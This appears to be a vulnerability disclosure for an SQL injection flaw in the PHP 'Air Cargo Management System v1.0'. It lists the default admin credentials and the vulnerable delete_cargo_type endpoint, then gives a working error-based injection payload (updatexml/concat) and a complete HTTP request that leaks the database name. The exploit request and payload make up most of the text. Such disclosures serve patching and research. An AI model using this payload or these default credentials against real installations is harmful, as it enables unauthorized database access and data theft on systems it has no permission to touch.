# Air Cargo Management System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html

The password for the backend login account is: admin/admin123

Vulnerability File: /acms/classes/Master.php?f=delete_cargo_type

Vulnerability location: /acms/classes/Master.php?f=delete_cargo_type, id

[+] Payload: id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /acms/classes/Master.php?f=delete_cargo_type HTTP/1.1
Host: 192.168.1.19
Content-Length: 65
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/acms/admin/?page=cargo_types
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8j006kgjjl9sdts88scke1lkuq
Connection: close

id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
```

![image](https://user-images.githubusercontent.com/54017627/166405151-ad83c64a-f11f-4e80-a3f8-0c47512a9273.png)
